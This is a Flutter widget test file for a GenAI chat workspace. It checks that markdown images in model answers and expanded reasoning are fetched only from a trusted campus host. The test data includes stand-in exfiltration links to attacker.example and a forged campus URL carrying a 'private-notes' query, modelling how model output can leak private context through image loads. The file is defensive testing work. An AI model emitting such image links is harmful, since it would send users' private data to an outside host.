import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:techpie/features/genai/application/genai_agent_runner.dart';
import 'package:techpie/features/genai/domain/genai_agent_contract.dart';
import 'package:techpie/features/genai/domain/genai_contract.dart';
import 'package:techpie/features/genai/presentation/genai_thinking_view.dart';
import 'package:techpie/features/genai/presentation/genai_workspace.dart';

import '../support/workspace_server.dart';

const _campusImage = 'https://genaipic.shanghaitech.edu.cn/sys/common/static/image15test/chart.png';
const _externalImage = 'https://attacker.example/collect?context=private-notes';

void main() {
  Future<void> recordImageLoads(
    Future<void> Function(_ImageClient client) body,
  ) async {
    final client = _ImageClient();
    debugNetworkImageHttpClientProvider = () => client;
    try {
      await body(client);
    } finally {
      debugNetworkImageHttpClientProvider = null;
      PaintingBinding.instance.imageCache.clear();
      PaintingBinding.instance.imageCache.clearLiveImages();
    }
  }

  for (final agent in [false, true]) {
    testWidgets('workspace agent=$agent fetches only trusted images', (tester) async {
      await recordImageLoads((client) async {
        tester.view.physicalSize = const Size(1200, 1000);
        tester.view.devicePixelRatio = 1;
        addTearDown(tester.view.resetPhysicalSize);
        addTearDown(tester.view.resetDevicePixelRatio);
        final demo = await TestGenAiWorkspace.create(chunkDelay: Duration.zero);
        addTearDown(demo.dispose);
        if (agent) {
          demo.workspace.configureAgent(
            runner: GenAiAgentRunner(
              tools: GenAiAgentToolRegistry([]),
              streamChat: (_, __) async* {
                yield const GenAiTextDelta('Image response');
                yield const GenAiChatFinished(GenAiFinishReason.stop);
              },
            ),
          );
          demo.workspace.setAgentEnabled(true);
        }
        await tester.pumpWidget(
          MaterialApp(
            home: GenAiWorkspace(
              controller: demo.workspace,
              login: (_) async => null,
            ),
          ),
        );
        await tester.pumpAndSettle();
        final sending = demo.workspace.send('Show returned images');
        await tester.pumpAndSettle();
        await sending;
        // Supply the same model-controlled content to each workspace mode.
        demo.workspace.turns.single.answer = '''
![Extracted document diagram]($_externalImage)

![Search result](//attacker.example/private-notes.png)

![Forged campus link]($_campusImage?context=private-notes)

![Generated campus chart]($_campusImage)
''';
        demo.workspace.toggleThinking();
        await tester.pumpAndSettle();

        expect(demo.workspace.turns.single.isAgent, agent);
        expect(find.textContaining('外部图片未自动加载'), findsNWidgets(3));
        expect(
          client.requests.map((uri) => uri.toString()),
          [_campusImage],
        );
        final images = tester.widgetList<Image>(find.byType(Image)).toList();
        expect(
          images.where((image) => image.image is NetworkImage),
          hasLength(1),
        );
        expect(tester.takeException(), isNull);
      });
    });
  }

  testWidgets('expanded reasoning never fetches model-controlled external images', (tester) async {
    await recordImageLoads((client) async {
      await tester.pumpWidget(
        const MaterialApp(
          home: Scaffold(
            body: GenAiThinkingView(
              reasoning: '![Private document extract]($_externalImage)',
              initiallyExpanded: true,
            ),
          ),
        ),
      );
      await tester.pumpAndSettle();
      expect(
        find.text('外部图片未自动加载 · Private document extract'),
        findsOneWidget,
      );
      expect(find.byType(Image), findsNothing);
      expect(client.requests, isEmpty);
      expect(tester.takeException(), isNull);
    });
  });
}

/// Records image loads without making any network connections.
class _ImageClient implements HttpClient {
  final requests = <Uri>[];

  @override
  Future<HttpClientRequest> getUrl(Uri url) async {
    requests.add(url);
    throw const HttpException('Synthetic image load failure');
  }

  @override
  dynamic noSuchMethod(Invocation invocation) => super.noSuchMethod(invocation);
}
